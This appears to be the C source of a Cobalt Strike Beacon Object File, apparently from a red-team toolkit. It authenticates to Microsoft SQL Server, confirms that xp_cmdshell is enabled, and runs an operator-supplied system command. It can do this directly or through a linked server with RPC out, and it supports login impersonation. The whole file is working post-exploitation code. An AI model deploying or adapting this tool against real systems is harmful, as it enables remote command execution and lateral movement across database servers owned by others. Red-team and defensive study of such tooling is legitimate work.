#include "base.c"
#include "bofdefs.h"
#include "sql.c"
#include "sql_modules.c"

void ExecuteXpCmd(char *server, char *database, char *link, char *impersonate, char *command, char *user, char *password) {
  SQLHENV env = NULL;
  SQLHSTMT stmt = NULL;
  SQLHDBC dbc = NULL;
  char *query = NULL;
  size_t totalSize;
  SQLRETURN ret;
  unsigned int timeout = 10;

  if (link == NULL) {
    dbc = ConnectToSqlServerAuth(&env, server, database, user, password);
  } else {
    dbc = ConnectToSqlServerAuth(&env, server, NULL, user, password);
  }

  if (dbc == NULL) {
    goto END;
  }

  ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
  if (!SQL_SUCCEEDED(ret)) {
    internal_printf("[!] Failed to allocate statement handle\n");
    goto END;
  }

  if (IsModuleEnabled(stmt, "xp_cmdshell", link, impersonate)) {
    internal_printf("[*] xp_cmdshell is enabled\n");
  } else {
    internal_printf("[!] xp_cmdshell is not enabled\n");
    goto END;
  }

  ret = ODBC32$SQLCloseCursor(stmt);
  if (!SQL_SUCCEEDED(ret)) {
    internal_printf("[!] Failed to close cursor\n");
    goto END;
  }

  if (link != NULL) {
    if (IsRpcEnabled(stmt, link)) {
      internal_printf("[*] RPC out is enabled\n");
    } else {
      internal_printf("[!] RPC out is not enabled\n");
      goto END;
    }

    ODBC32$SQLCloseCursor(stmt);
  }

  ret = ODBC32$SQLSetStmtAttr(stmt, SQL_ATTR_QUERY_TIMEOUT, (SQLPOINTER)(uintptr_t)timeout, 0);
  if (!SQL_SUCCEEDED(ret)) {
    internal_printf("[!] Failed to set query timeout\n");
    goto END;
  }

  internal_printf("[*] Executing system command...\n\n");

  if (link == NULL) {
    char *prefix = "EXEC xp_cmdshell '";
    char *suffix = "';";

    totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1;
    query = (char *)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, command, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix, totalSize - MSVCRT$strlen(query) - 1);

    printoutput(FALSE);

    if (!HandleQuery(stmt, (SQLCHAR *)query, link, impersonate, FALSE)) {
      goto END;
    }

    PrintQueryResults(stmt, TRUE);
  } else {
    char *prefix = "SELECT 1; EXEC master..xp_cmdshell '";
    char *suffix = "';";

    totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(command) + MSVCRT$strlen(suffix) + 1;
    query = (char *)intAlloc(totalSize * sizeof(char));

    MSVCRT$strcpy(query, prefix);
    MSVCRT$strncat(query, command, totalSize - MSVCRT$strlen(query) - 1);
    MSVCRT$strncat(query, suffix, totalSize - MSVCRT$strlen(query) - 1);

    printoutput(FALSE);

    if (!HandleQuery(stmt, (SQLCHAR *)query, link, impersonate, TRUE)) {
      goto END;
    }

    internal_printf("[*] Command executed (Output not returned for linked server cmd execution)\n");
  }

END:
  if (query != NULL)
    intFree(query);
  ODBC32$SQLCloseCursor(stmt);
  DisconnectSqlServer(env, dbc, stmt);
}

VOID go(IN PCHAR Buffer, IN ULONG Length) {
  char *server;
  char *database;
  char *link;
  char *impersonate;
  char *command;
  char *user;
  char *password;

  datap parser;
  BeaconDataParse(&parser, Buffer, Length);

  server = BeaconDataExtract(&parser, NULL);
  database = BeaconDataExtract(&parser, NULL);
  link = BeaconDataExtract(&parser, NULL);
  impersonate = BeaconDataExtract(&parser, NULL);
  command = BeaconDataExtract(&parser, NULL);
  user = BeaconDataExtract(&parser, NULL);
  password = BeaconDataExtract(&parser, NULL);

  server = *server == 0 ? "localhost" : server;
  database = *database == 0 ? "master" : database;
  link = *link == 0 ? NULL : link;
  impersonate = *impersonate == 0 ? NULL : impersonate;
  user = *user == 0 ? NULL : user;
  password = *password == 0 ? NULL : password;

  if (!bofstart()) {
    return;
  }

  if (UsingLinkAndImpersonate(link, impersonate)) {
    return;
  }

  ExecuteXpCmd(server, database, link, impersonate, command, user, password);

  printoutput(TRUE);
};